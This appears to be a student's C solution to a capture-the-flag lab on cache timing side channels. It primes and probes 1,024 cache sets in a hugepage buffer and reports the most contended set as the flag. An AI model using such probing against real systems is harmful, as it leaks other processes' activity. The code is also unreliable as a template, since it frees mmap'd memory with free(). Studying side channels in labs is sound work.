#include "util.h"
// mman library to be used for hugepage allocations (e.g. mmap or posix_memalign only)
#include <sys/mman.h>
#include <unistd.h>

int main(int argc, char const *argv[]) {
    int flag = -1;

    // Put your capture-the-flag code here
    
    char *buf= mmap(NULL, 1048576*2, PROT_READ | PROT_WRITE, MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB, -1, 0);
    int array[1024] = {0};
    if (buf == (void*) - 1) {
     perror("mmap() error\n");
     exit(EXIT_FAILURE);
    }
    for(int z = 0; z < 100; z++) {
    for(int i = 0; i < 1024; i++) {
	    for(int k = 0; k < 10; k++) {

    	for(int j = 0; j < 16; j++) {
		((volatile char*)buf)[(j << 16) + (i << 6)] ^= 1;
		//printf("%d\n", buf[(j<<16) + (i<<6)]);
	}
	    }
   for(volatile int y = 0; y < 200; y++);
    
        for(int j = 15; j >= 0; j--) {
              //  ((volatile char*)buf)[(j<<16)+(i<<6)] = 1;
		uint64_t t = measure_one_block_access_time((ADDR_PTR)&buf[(j << 16) + (i << 6)]);
		if(t > 65) {
		array[i]++;
		}
		//if(buf[(j<<16)+(i<<6)] != 1) {
		     //  printf("%d\n", i);
	//	}	   
//		array[t]++;
		//printf("%d %d\n", array[t], t);	
        }
    }
    }
   // printf("%d %d %d %d %d %d %d %d %d\n", a, b, c, d, e, f, g, h, k);
   int max = 0;
    for(int i = 0; i < 1024; i++) {
	    if(array[i] > max) {
		    max = array[i];
		    flag = i;
	    }
		
	    //printf("%d %d\n", i, array[i]);
    }
    printf("Flag: %d\n", flag);
    free(buf);
   // free(array);
    return 0;
}
